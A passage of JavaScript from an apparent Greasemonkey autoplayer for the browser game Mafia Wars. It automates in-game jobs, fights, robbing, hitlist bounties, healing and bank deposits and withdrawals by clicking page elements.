      addToLog('process Icon', energyIcon + '<span style="color:#009966; font-weight: bold;">Burning through energy reserve to level up.</span>');
    } else {
      DEBUG('Not within reach of a level up. Energy burning is off.');
    }
  }

  // Common function if job has failed
  var doJobFunction = function (jobResult) {
    if (!jobResult) {
      addToLog('warning Icon', 'Unable to perform job ' + jobName + '.');
      var jobs = getSavedList('jobsToDo', '');
      if (jobs.length == 0) {
        // Skip jobs temporarily, and check the home page
        DEBUG('No more jobs to perform.');
        skipJobs = true;
        goHome();
      } else {
        // Else Get the next job to perform
        DEBUG('Looking for the next job to perform.');
        popJob();
        autoMission();
      }
    }
  };

  // Go to the correct city.
  if (city != cityno) {
    Autoplay.fx = function() { doJobFunction(goLocation(cityno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doJobFunction(goJobTab(tabno)); };
    Autoplay.start();
    return;
  }

  // Go to the correct job tabnopath in LV
  if(city == LV){
    if (!onJobTabpath(tabnopath)) {
      goJobTabPath(tabnopath);
    }
  }

  // Buy requirements first, if any
  if (getJobRowItems(jobName)) {
    if (jobid != GM_getValue('selectMission', 1))
      Autoplay.fx = autoMission;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return;
  }

  // Do the job
  Autoplay.fx = function() { doJobFunction(goJob(jobno)); };
  Autoplay.delay = (isGMChecked('burstJob') && GM_getValue('burstJobCount', 0) == 0) ? noDelay : getAutoPlayDelay();
  Autoplay.start();
} // end of automission



function currentJobTab() {
  var elt = xpathFirst('.//li[contains(@class, "tab_on")]//a', innerPageElt);
  if (!elt || !elt.getAttribute('onclick').match(/tab=(\d+)/)) {
    return -1;
  }
  // FIXME: Not working for chrome at the moment
  //return parseInt(RegExp.$1);
  return parseInt(elt.getAttribute('onclick').split('tab=')[1].split("'")[0]);
}

    /// current Job Tab path
function currentJobTabPath() {
  var tst = null ;
  var elt = xpathFirst('.//div[contains(@class, "path_on")]//a', innerPageElt);
//  if (!elt)     DEBUG(' JOB TAB - path - !elt path not found - ');
//       tst = (elt.getAttribute('onclick').match(/  0  /) ); // returns 0
//new_ -- gets matched literally as a string, as is.
//\d -- means match any and only digits
//+ -- means to match thoose digits one or more times
//$ -- this means the end of the string, so with the pattern pieces before it, it must not have anything but "new_" and some numbers, then the end of the string (string being the ID attribute)

  tst = parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
//    DEBUG(' JOB TAB - path - returning  tst =' + tst + '=');
  if (tst==null)     DEBUG(' JOB TAB - path - !tst path not found - ');
  if   (!elt ||  tst==null ) {
        DEBUG(' JOB TAB - path - not found RETURNING -1 no elt or tst');
    return -1;  }
//    return parseInt(elt.getAttribute('onclick').split('ExpertMapController.changePath(')[1].split(');')   ) ; // returns 0,
  return tst;
}

function onJobTab(tabno) {
  return currentJobTab() == parseInt(tabno) ? true : false;
}

function onJobTabpath(tabnopath) {
  return currentJobTabPath() == parseInt(tabnopath) ? true : false;
}

function canForceHeal() {
  if(!isGMChecked('hideInHospital'))
    return true;

  // bypass all lower HiH settings and heal while health is above 19 and below 'need to heal minium'
  if((health > 19) && isGMChecked('forceHealOpt7') ) {
    DEBUG( 'heal if above 19 is checked, and true, in canforceheal ');
    return true;
    }

  // if able to level up on stamina and checked to do so, bypass HiH
  if((SpendStamina.canBurn && stamina > 0) && isGMChecked('allowStaminaToLevelUp') ) {
    DEBUG( 'enough stamina left to level up, and burn to level up, checked in canforceheal ');
    return true;
    }

  // Heal after 5 minutes
  if(isGMChecked('forceHealOpt5') && GM_getValue('healWaitStarted') && timeLeftGM('healWaitTime')) {
    DEBUG( ' healing blocked ' + GM_getValue('healWaitStarted') + ' due to 5 minute wait timer. remaining:' + timeLeftGM('healWaitTime') ); // hide/remove after testing
   return false;
  } else {
      if(isGMChecked('forceHealOpt5')) {
        DEBUG( '5 minute timer is up, Allowing Heal'); // hide/remove after testing
        return true;
      }
  }
  // Heal when stamina is full
  if (isGMChecked('forceHealOpt4') && stamina >= maxStamina)
    return true;

  // Heal when stamina can be spent
  if (isGMChecked('forceHealOpt3') && canSpendStamina(0))
    return true;

  DEBUG( 'healing blocked in HiH (canforceheal) '); // hide/remove after testing
  return false;
}

function canSpendStamina(minHealth) {
  if (!stamina) return false;
  if (!isGMChecked('staminaSpend')) return false;

  var stamMode = getStaminaMode();

  if (isNaN(minHealth)) {
    // Up to 28 damage can be received in a fight.
    minHealth = isGMChecked('attackCritical') ? 20 : 29;
    switch (stamMode) {
      case STAMINA_HOW_AUTOHITLIST:
      case STAMINA_HOW_ROBBING:
        minHealth = 0;
      case STAMINA_HOW_FIGHTROB:
        if( stamina > 25)  {
          minHealth = 0;
        }
    }
  }

  if (health < minHealth) {
    DEBUG('Not spending stamina: health=' + health + ', minimum=' + minHealth);
    return false;
  }

  if (stamina <= SpendStamina.floor && !SpendStamina.canBurn) {
    DEBUG('Not spending stamina: stamina=' + stamina +
          ', floor=' + SpendStamina.floor + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  if (stamina < SpendStamina.ceiling && !SpendStamina.canBurn &&
      !GM_getValue('useStaminaStarted')) {
    DEBUG('Rebuilding stamina: stamina=' + stamina +
          ', ceiling=' + SpendStamina.ceiling + ', burn=' + SpendStamina.canBurn);
    return false;
  }

  // Only spend if stamina >= 20
  if(GM_getValue('staminaSpendHow') != STAMINA_HOW_RANDOM && stamMode == STAMINA_HOW_ROBBING)
    return (stamina >= 25);
  else if (stamMode == STAMINA_HOW_ROBBING) {
    if (stamina >= 25) return true;
    else {
      randomizeStamina();
      return canSpendStamina();
    }
  }

  return true;
}

function autoHitlist() {
  // Go to the correct city.
  var loc = GM_getValue('autoHitListLoc', NY);
  if (loc != cities.length && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoHitlist.profileSearch && !autoHitlist.setBounty) {
    Autoplay.fx = goFightTab;
    //Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  // Go to the opponent's profile.
  var id = parseInt(GM_getValue('autoHitOpponentList', ''));
  if (!id) {
    // If nothing is here, and fighting is "random", fight someone else
    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;
    // The user-specified list is empty or invalid.
    addToLog('warning Icon', 'Can\'t autohit because the list of opponents is empty or invalid. Turning automatic hitlisting off.');
    GM_setValue('staminaSpend', 0);
    if(isGMChecked('bgAutoHitCheck')) GM_setValue('bgAutoHitCheck',0);
    return false;
  }

  opponent = new Player();
  opponent.id = String(id);

  if (!onProfileNav() && !autoHitlist.setBounty) {
    // Go to the opponent's profile.
    autoHitlist.profileSearch = opponent;
    Autoplay.fx = goProfileNav(opponent);
    Autoplay.start();
    return true;
  }

  if (autoHitlist.profileSearch && onProfileNav()) {
    opponent = autoHitlist.profileSearch;
    autoHitlist.profileSearch = undefined;
    opponent.profileHitlist = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    DEBUG('Hitlisting from profile');
    var hitlistElt = opponent.profileHitlist;
    autoHitlist.setBounty = true;
    var elt = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    if (elt) {
      Autoplay.fx = function() {
        clickAction = 'autohit';
        clickContext = opponent;
        clickElement(elt);
        DEBUG('Clicked "Add to Hitlist".');
      };
      Autoplay.start();
      return true;
    }
  }

  if(autoHitlist.setBounty){
    autoHitlist.setBounty = undefined;
    var formElt = xpathFirst('.//form[@id="createhit"]', innerPageElt);
    // Set the amount (random).
    var amountElt = xpathFirst('.//input[@type="text"]', formElt);
    if (!amountElt){
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }

    if(isGMChecked('autoHitListRandom')){
      amountElt.value = Math.pow(10, (Math.floor(Math.random()*4)+4));
    } else {
      amountElt.value = parseCash(GM_getValue('autoHitListBounty', 0));
    }

    // Make the hit
    var submitElt = xpathFirst('.//button[@type="submit"]', formElt);
    if (!submitElt) {
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }
    Autoplay.fx = function() {
      clickAction = 'autohit';
      clickContext = opponent;
      submitElt.click();
      DEBUG('Clicked to Set Bounty');
    };
    Autoplay.start();
    return true;
  }
}

function autoFight(how) {
  // Go to the correct city.
  var loc = GM_getValue('fightLocation', NY);
  if( loc == RANDOM_CITY){
    loc = GM_getValue('fightNewLocation', NY);
  }

  if (loc != ACTIVE_CITY && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoFight.profileSearch) {
    Autoplay.fx = goFightTab;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Get an opponent.
  var opponent;
  if (autoFight.profileSearch && onProfileNav()) {
    opponent = autoFight.profileSearch;
    autoFight.profileSearch = undefined;
    lastOpponent = undefined;
    if (isGMChecked('staminaPowerattack') && GM_getValue('burstMode', 0) == BURST_ALWAYS && ((isGMChecked('stopPA') && health >= GM_getValue('stopPAHealth')) || !isGMChecked('stopPA')))
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=power_attack") and contains(., "Power Attack")]', innerPageElt);
    if (!opponent.profileAttack)
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=attack") and contains(., "Attack")]', innerPageElt);
    DEBUG('Attacking from profile');
  } else if (how == STAMINA_HOW_FIGHT_LIST) {
    var id = parseInt(GM_getValue('fightList', ''));
    if (!id) {
      // If nothing is here, and fighting is "random", fight someone else
      if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;

      // The user-specified list is empty or invalid.
      addToLog('warning Icon', 'Can\'t fight because the list of opponents is empty or invalid. Turning automatic fighting off.');
      GM_setValue('staminaSpend', 0);
      return false;
    }
    opponent = new Player();
    opponent.id = String(id);
    DEBUG('Attacking from fight list');
  } else {
    // Check for any new opponents.
    opponent = findFightOpponent(innerPageElt);
    DEBUG('Attacking from find fight list');

    // For stealth mode fights, if we don't have a new opponent then
    // choose one of the inactive opponents we've already fought.
    if ((!opponent || opponent === -1) &&
        isGMChecked('fightStealth')) {
      var l = fightListInactive.get();
      if (l.length) {
        addToLog('info Icon', '"Use Fight Stealth" is enabled, attacking previously "deemed" iced targets.');
        opponent = l[Math.floor(Math.random() * l.length)];
        opponent.profileAttack="";//stop TOS screen
        DEBUG('Attacking from inactive list');
      }
    }

    if (opponent === -1) {
      DEBUG('No opponents even after seeing the fight list.');
      setNextFightCity();
      return false;
    }

    if (!opponent) {
      // Go to the fight list to find opponents.
      addToLog('process Icon', 'No opponents. Going to fight list.');
      Autoplay.fx = goFightNav;
      Autoplay.start();
      return true;
    }
  }
  if (!opponent) return false;

  var attackElt = opponent.profileAttack;
  if (!attackElt && opponent.attack && opponent.attack.scrollWidth > 0) {
    attackElt = opponent.attack;
  }

  // Just click the "Attack Again" button if it's there
  if (lastOpponent && lastOpponent.attackAgain && opponent.match(lastOpponent)) {
    attackElt = lastOpponent.attackAgain;
    DEBUG('Clicking "Attack Again"!');
  }

  if (!attackElt) {
    if (opponent.id && !onProfileNav()) {
      // Go to the opponent's profile.
      autoFight.profileSearch = opponent;
      Autoplay.fx = function(){goProfileNav(opponent);};
      Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
      Autoplay.start();
      return true;
    }
    DEBUG('No way to attack opponent, id=' + opponent.id);
    return false;
  }

  // Check for pulse, skipped iced opponents on the fight list
  if (isGMChecked('iceCheck') && (how == STAMINA_HOW_FIGHT_LIST)) {
    createAjaxPage(true);
    var iceElt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxPage + '","' + SCRIPT.controller + 'hitlist' + SCRIPT.action + 'set&target_id=' + opponent.id + '", 1, 1, 0, 0); return false;'});
    Autoplay.fx = function() {
      clickAction = 'icecheck fightlist';
      clickContext = opponent;
      clickElement(iceElt);
    };
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }
  // Attack!
  Autoplay.fx = function() {
    clickAction = 'fight';
    clickContext = opponent;
    staminaBurst (BURST_ALWAYS, attackElt);
    DEBUG('Clicked to fight: name=' + opponent.name +
          ', id=' + opponent.id + ', level=' + opponent.level +
          ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
  };
  Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
  Autoplay.start();
  return true;
}

function setNextFightCity(){
  var loc = GM_getValue('fightLocation', NY);
  if( loc != RANDOM_CITY){
    return;
  }
  var newCity;
  do {
    newCity = Math.floor(Math.random()*(cities.length));
  } while (level < cities[newCity][CITY_LEVEL] || isGMEqual('fightNewLocation', newCity));

  DEBUG('Setting to ' + cities[newCity][CITY_NAME] + ' for next fight.');
  GM_setValue('fightNewLocation', newCity);
}

function staminaBurst (burstMode, clickElt) {
  var numClicks = 1;
  if (isGMChecked('burstStamina') && GM_getValue('burstPoints', 0) > 0) {
    numClicks = isGMEqual('burstMode',burstMode) ? GM_getValue('burstPoints', 1) : 1;
  }
  if(isGMChecked('stopBursts') && health < GM_getValue('stopBurstsHealth')) numClicks = 1;
  DEBUG('Health : '+health+ ' - Min Health for Bursts : '+GM_getValue('stopBurstsHealth') + ' - numClicks : ' +numClicks);
  clickBurst (clickElt, parseInt(numClicks));
}

function autoRob() {
  var loc = GM_getValue('robLocation', NY);
  if (city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onRobbingTab()) {
    Autoplay.fx = goRobbingTab;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  if (needToRefresh()) {
    DEBUG("Refreshing the rob grid.");
    // refresh the 3x3 grid.
    Autoplay.fx = refreshRobbingGrid;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  } else {
    Autoplay.fx = function(){
      clickAction = 'autoRob';
      clickContext = getCurRobSlotId();
      DEBUG("Context : " + clickContext);
      doRob();
    };
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }
}

function onRobbingTab() {
  // Return true if we're on the robbing tab, false otherwise.
  if (xpathFirst('//li[contains(@class, "tab_on")]//a[contains(., "Robbing")]')) {
    return true;
  }
  return false;
}

function goRobbingTab() {
  var elt = xpathFirst('//div[@class="tab_content"]//a[contains(., "Robbing")]');
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to robbing tab.');
}

function needToRefresh()
{
  var eltRefreshLink = xpathFirst('//a[@id="rob_refresh_cost"]//span[contains(.,"0 stamina")]');
  if(eltRefreshLink)
    return true;

  return false;
}

function refreshRobbingGrid() {
  var elt = xpathFirst('//a[@id="rob_refresh_cost"]');
  clickElement(elt);
  DEBUG('Clicked to refresh robbing grid.');
};

function sleepRob(ms){
  var dt = new Date();
  dt.setTime(dt.getTime() + ms);
  while (new Date().getTime() < dt.getTime());
}

function doRob(){
  var m;
  var eltRobStam = xpathFirst('//div[@class="rob_prop_stamina"]');
  if (eltRobStam) {
    if (m = /(.*)/.exec(eltRobStam.innerHTML)) {
      var stam = m[1].replace(/[^0-9]/g, '');
      GM_setValue('totalRobStamInt', (isNaN(parseInt(GM_getValue('totalRobStamInt', 0))) ? 0 : parseInt(GM_getValue('totalRobStamInt', 0))) + parseInt(stam));
    }
  }
  if(isGMChecked('fastRob')){
    var eltRob = $x('//div[@class="rob_btn"]//a[@class="sexy_button_new short_red"]');
    for(var i=0, iLength = eltRob.length; i < iLength; i++){
      clickElement(eltRob[i]);
      sleepRob(500);
    }
  } else {
    var eltRob = xpathFirst('//div[@class="rob_btn"]//a[@class="sexy_button_new short_red"]');
    clickElement(eltRob);
    DEBUG('Clicked to rob.');
  }
}

function getCurRobSlotId(){
  var eltRob = xpathFirst('//div[@class="rob_btn"]//a[@class="sexy_button_new short_red"]');
  if(eltRob) // rob btn, rob target, rob slot
    return eltRob.parentNode.parentNode.parentNode.id;
  return null;
}

function logRobResponse(rootElt, resultElt, context) {
  var robSlotId = context;
  var m;
  var needStatUpdate = false;
  var eltRob = xpathFirst('//div[@id="'+ robSlotId +'" and @class="rob_slot"]');
  if (eltRob) {
    var success = false;
    var targetElt = xpathFirst('.//div[@class="rob_res_target_name"]/a',eltRob);
    var expElt   = xpathFirst('.//div[@class="rob_res_expanded_details_exp"]',eltRob);
    var cashElt  = xpathFirst('.//div[@class="rob_res_expanded_details_cash"]',eltRob);
    var itemElt = xpathFirst('.//div[@class="rob_res_expanded_details_item"]',eltRob);
    var user   = linkToString(targetElt, 'user');
    var result = 'Robbed ' + user + ' ';

    if(xpathFirst('.//div[@class="rob_res_outcome good"]',eltRob)){
      success = true;
      if (cashElt)
        result += ' with <span class="good">Success</span>, gaining <span class="good">'+ cashElt.innerHTML +'</span> and';
      else
        if (itemElt)
          result += ' with <span class="good">Success</span>, gaining <span class="good">'+ itemElt.innerHTML +'</span> and';
    }
    else
      result += ' and <span class="bad">Failed</span>, gaining';

    if (expElt)
      result += ' <span class="good">' + expElt.innerHTML + '</span>.';

    addToLog('yeah Icon', result);

    if (eltRob)
      // Look for any loot on rob slot
      if (m = /alt="(.*?)"/.exec(eltRob.innerHTML)) {
        addToLog('lootbag Icon', 'Found <span class="loot">'+ m[1] + '</span> in robbing.');
      }

    if (expElt)
      if (m = /(\d+) Experience/.exec(expElt.innerHTML)) {
        var exp = m[1].replace(/[^0-9]/g, '');
        updateRobStatistics(success,parseInt(exp));
        needStatUpdate = true;
      }

    if (cashElt && cashElt.innerHTML) {
      //if (m = /(.*)/.exec(cashElt.innerHTML)) {
      var cashInt = parseCash(cashElt.innerHTML);
      var cashLoc = parseCashLoc(cashElt.innerHTML);
      GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashInt));
      switch (cashLoc) {
        case NY: GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashInt)); break;
        case CUBA: GM_setValue('fightWin$Cuba', String(parseInt(GM_getValue('fightWin$Cuba', 0)) + cashInt)); break;
        case MOSCOW: GM_setValue('fightWin$Moscow', String(parseInt(GM_getValue('fightWin$Moscow', 0)) + cashInt)); break;
        case BANGKOK: GM_setValue('fightWin$Bangkok', String(parseInt(GM_getValue('fightWin$Bangkok', 0)) + cashInt)); break;
        case LV: GM_setValue('fightWin$Vegas', String(parseInt(GM_getValue('fightWin$Vegas', 0)) + cashInt)); break;
      }
      needStatUpdate = true;
    }
  }

  randomizeStamina();

  if (needStatUpdate) updateLogStats();
}

function updateRobStatistics(success, exp) {
  if (success)
    GM_setValue('robSuccessCountInt', GM_getValue('robSuccessCountInt', 0) + 1);
  else if (success == false)
    GM_setValue('robFailedCountInt', GM_getValue('robFailedCountInt', 0) + 1);

  if (exp) {
    GM_setValue('totalRobExpInt', GM_getValue('totalRobExpInt', 0) + parseInt(exp) );
    GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + parseInt(exp));
  }
/*
  // TODO : add/show on log statistics
  DEBUG("Rob total exp : " + GM_getValue('totalRobExpInt',0));
  DEBUG("Rob success : " + GM_getValue('robSuccessCountInt',0));
  DEBUG("Rob failed : " + GM_getValue('robFailedCountInt',0));
  */
}

function autoHitman() {
  // Go to the correct city.
  var i, loc = GM_getValue('hitmanLocation', NY);
  if (loc != cities.length && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.start();
    return true;
  }

  // Make sure we're on the hitlist tab.
  if (!onHitlistTab()) {
    Autoplay.fx = goHitlistTab;
    Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Get the list of targets.
  var opponents = getHitlist(innerPageElt, true);
  if (!opponents) return false;

  // Get the targets that are acceptable.
  DEBUG('Applying criteria to displayed targets.');
  var blacklist = getSavedList('hitmanListAvoid').concat(getSavedList('fightListAvoid'));
  var bountyMin = parseCash(GM_getValue('hitmanBountyMin', 0));
  var hitmanNames = isGMChecked('hitmanNames');
  var avoidNames = isGMChecked('hitmanAvoidNames');
  var onlyNames = isGMChecked('hitmanOnlyNames');
  var blacklistCount = 0;
  var bountyCount = 0;
  var namesCount = 0;
  var opponentsQualified = [];
  var exactBounty = (GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY) == BOUNTY_EXACT_AMOUNT);
  for (i = 0, iLength=opponents.length; i < iLength; i++) {
    var opponent = opponents[i];
    if (blacklist.indexOf(opponent.id) != -1) {
      blacklistCount++;
      continue;
    }
    var bounty = parseCash(opponent.bounty);
    if (bounty && ((bounty < bountyMin)|| (exactBounty && (bounty > bountyMin)))) {
      bountyCount++;
      continue;
    }
    DEBUG(decodeHTMLEntities(opponent.name)+' ' +isFamily(decodeHTMLEntities(opponent.name)),STAMINA_HOW_HITMAN);
    if (hitmanNames && avoidNames && isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_HITMAN)) {
      namesCount++;
      continue;
    }
    if (hitmanNames && onlyNames && !isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_HITMAN)) {
      namesCount++;
      continue;
    }
    opponentsQualified.push(opponent);
  }

  DEBUG(bountyCount + ' disqualified on bounty, ' + namesCount + ' on name, ' + blacklistCount + ' on blacklist.');

  if (!opponentsQualified.length) return false;

  // Pick a target based on saved settings.
  var bountyIndex = 0;

  switch (GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY)) {
    case BOUNTY_LONGEST_TIME:
      bountyIndex = (opponentsQualified.length - 1);
      break;

    case BOUNTY_HIGHEST_BOUNTY:
      var bigBounty = 0;
      for (i = 0, iLength=opponentsQualified.length; i < iLength; i++) {
        if (parseCash(opponentsQualified[i].bounty) > bigBounty) {
          bountyIndex = i;
          bigBounty = parseCash(opponentsQualified[i].bounty)
        }
      }
      break;

    case BOUNTY_RANDOM:
      bountyIndex = Math.floor(Math.random() * opponentsQualified.length);
      break;

    case BOUNTY_SHORTEST_TIME:
    default:
      bountyIndex = 0;
  }
  Autoplay.fx = function() {
    clickAction = 'hitman';
    clickContext = opponentsQualified[bountyIndex];
    staminaBurst (BURST_ALWAYS, clickContext.attack);
    DEBUG('Clicked to hit ' + clickContext.name + ' (' + clickContext.id + ').');
  };
  Autoplay.delay = isGMChecked('staminaNoDelay') ? noDelay : getAutoPlayDelay();
  Autoplay.start();
  return true;
}

function getStaminaMode() {
  var how = GM_getValue('staminaSpendHow');

  // If fighting randomly, assign randomly chosen mode
  if (how == STAMINA_HOW_RANDOM) {
    if (isUndefined(newStaminaMode))
      newStaminaMode = Math.floor(Math.random()*(staminaSpendChoices.length - 1));
    how = newStaminaMode;
  }
  else {
    newStaminaMode = undefined;
  }

  return how;
}

function autoStaminaSpend() {
  if (!isGMChecked('staminaSpend')) return false;

  if (SpendStamina.floor &&
      isGMChecked('allowStaminaToLevelUp') &&
      GM_getValue('autoStamBurn') !== SpendStamina.canBurn) {
    GM_setValue('autoStamBurn', SpendStamina.canBurn);
    if (SpendStamina.canBurn) {
      addToLog('process Icon', staminaIcon + '<span style="color:#009966; font-weight: bold;">Burning through stamina reserve to level up.</span>');
    } else {
      DEBUG('Not within reach of a level up. Stamina burning is off.');
    }
  }

  var how = getStaminaMode();
  switch (how) {
    case STAMINA_HOW_FIGHT_RANDOM:
    case STAMINA_HOW_FIGHT_LIST:
      return autoFight(how);

    case STAMINA_HOW_FIGHTROB:
//    case STAMINA_HOW_FIGHT_RANDOM:
      if ( (health < 21)  && (stamina > 25 ) ) {
        DEBUG(' -- going to autorob -- ');
        return autoRob();
      } else {
        DEBUG(' -- going to autofight -- ');
        return autoFight(how);
      }

    case STAMINA_HOW_ROBBING:
      return autoRob();

    case STAMINA_HOW_HITMAN:
      return autoHitman(how);

    case STAMINA_HOW_AUTOHITLIST:
      return autoHitlist();

    default:
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized stamina setting: ' +
               'staminaSpendHow=' + how);
  }

  return false;
}

function autoBankDeposit(bankCity, amount) {
  if (!quickBankFail) return false;

  // Only quickbank in Vegas, since the vault is only available in flash.
  if (bankCity == LV) {
    quickBankFail = false;
    return false;
  }

  // Make sure we're at the bank.
  var bankElt = xpathFirst('.//div[@id="bank_popup"]', popupfodderElt);
  if (!bankElt) {
    Autoplay.fx = goBank;
    Autoplay.start();
    return true;
  }

  // Set the amount (if provided).
  if (amount) {
    var amountElt = xpathFirst('.//input[@id="deposit_amount"]', bankElt);
    if (!amountElt) {
      addToLog('warning Icon', 'BUG DETECTED: No text input at bank.');
      return false;
    }
    amountElt.value = amount;
  }

  // Grab the deposit button!
  var submitElt = xpathFirst('.//div[@id="bank_dep_button"]/a[contains(@onclick,"deposit(")]', bankElt);
  if (!submitElt) {
    addToLog('warning Icon', 'BUG DETECTED: No submit input at bank.');
    return false;
  }

  // Do not bank if city has changed
  if (city != bankCity) {
    addToLog('warning Icon', 'Switching city too fast, not banking cash.');
    return false;
  }

  // One last check to make sure the city hasn't changed
  var eltBankCity = xpathFirst('//a[@class="bank_deposit"]');
  if (eltBankCity) {
    if (eltBankCity.getAttribute('onclick').match(/xw_city=(\d+)/)) {
      var thisCity = RegExp.$1 - 1;
      if (thisCity != bankCity) {
          addToLog('warning Icon', 'Banking Error: Current City: ' + cities[thisCity][CITY_NAME] + ' Expected City: ' + cities[bankCity][CITY_NAME]);
          return false;
      }
    }
  }

  // Make the deposit
  Autoplay.fx = function() {
    quickBankFail = false;
    clickContext = bankCity;
    clickAction = 'deposit';
    clickElement (submitElt);
    DEBUG('Clicked to deposit.');
  };
  Autoplay.delay = noDelay;
  Autoplay.start();
  closePopup(bankElt.parentNode, "Bank Popup");
  return true;
}

function autoBankWithdraw(bankCity, amount) {
  if(bankCity == LV){
    DEBUG('Going to the vault to withdraw '+amount)
    var withdrawUrl = "xw_controller=propertyV2&xw_action=doaction&xw_city=5&doaction=ActionBankWithdrawal&building_type=6&city=5&amount=" + amount;
    var elt = makeElement('a', null, {'onclick':'return do_ajax("' + SCRIPT.ajaxResult + '","remote/html_server.php?' + withdrawUrl + '", 1, 1, 0, 0); return false;'});
    createAjaxPage(false, 'quick withdraw', bankCity);
    clickElement(elt);
    DEBUG('Clicked to withdraw from the vault.');
    return true;
  } else {
  DEBUG('Going to the bank')
  // Make sure we're at the bank.
  var formElt = xpathFirst('.//div[@id="bank_popup"]', popupfodderElt);
  if (!formElt) {
    Autoplay.fx = goBank;
    clickAction = 'withdraw';
    clickContext = amount;
    Autoplay.start();
    return true;
  } else {
    // Make sure the bank window is open!
    if (document.getElementById("bank_popup").parentNode.style.display == 'none') {
      Autoplay.fx = goBank;
      clickAction = 'withdraw';
      clickContext = amount;
      Autoplay.start();
      return true;
    }
  }

  // Set the amount (if provided).
  if (amount) {
    var amountElt = xpathFirst('.//input[@id="withdraw_amount"]', formElt);
    if (!amountElt) {
      addToLog('warning Icon', 'BUG DETECTED: No text input at bank.');
      return false;
    }
    amountElt.value = amount;
  }

  // Make the withdrawal.
  var submitElt = xpathFirst('.//div[@id="bank_with_button"]//a', formElt);
  if (!submitElt) {
    addToLog('warning Icon', 'BUG DETECTED: No submit input at bank.');
    return false;
  }
  Autoplay.fx = function() {
    clickAction = 'withdraw';
    clickElement (submitElt);
    DEBUG('Clicked to withdraw.');
  };
  Autoplay.delay = noDelay;
  Autoplay.start();
  return true;
  }
}

// Returns a non-empty array of the displayed opponents, or undefined.
function getHitlist(element, forceRefresh) {
  // If the list was already seen, don't read it again.
  if (!forceRefresh && getHitlist.opponents) {
    if (!getHitlist.opponents.length) return [];
    return getHitlist.opponents;
  }
  getHitlist.opponents = [];

  // Get each target in the displayed list.
  var rows = $x('.//table[@class="hit_list"]//tr', element);
  for (var i = 0, iLength=rows.length; i < iLength; ++i) {
    // Get the data cells in the row.
    var rowData = rows[i].getElementsByTagName('td');
    if (rowData.length < 5) continue;

    // Get the target's profile and attack links.
    var opponent = {
      attack:  xpathFirst('.//a', rowData[4]),
      payer:   xpathFirst('.//a', rowData[1]),
      profile: xpathFirst('.//a', rowData[0]),
      time:    rowData[3].innerHTML.untag().trim()
    };
    if (!opponent.profile || !opponent.attack) continue;

    // Get the target's id, name, title, and bounty.
    opponent.id = decodeID(opponent.profile.getAttribute('onclick').split('user=')[1].split('\'')[0].split('&')[0]);
    if (!opponent.id) continue;
    opponent.name = opponent.profile.innerHTML;
    if (opponent.profile.previousSibling &&
        opponent.profile.previousSibling.nodeValue.match(/\w+(?: \w+)*/)) {
      opponent.title = RegExp.lastMatch;
    }
    if (rowData[2].innerHTML.match(REGEX_CASH)) {
      opponent.bounty = RegExp.lastMatch;
    }

    /* Disabled for now as we don't have a synchronous level check!
    if (!running && isGMChecked('showLevel')) {
      var urlLoaded = function () {
        if (this.readyState == 4 && this.status == 200) {
          var s = this.responseText;
          var id = s.split('user=')[1].split('"')[0].split('\'')[0].split('&')[0];
          var profElt = xpathFirst('.//table[@class="hit_list"]//a[contains(@onclick, "user='+id+'") or contains(@onclick, "user='+escape(encode64(id))+'")]', element);
          if (profElt) {
              var testManiac = /level\s([a-z,A-Z,0-9]+)\sManiac/.test(s.untag());
              var resultManiac = RegExp.$1;
              if (testManiac == true) {
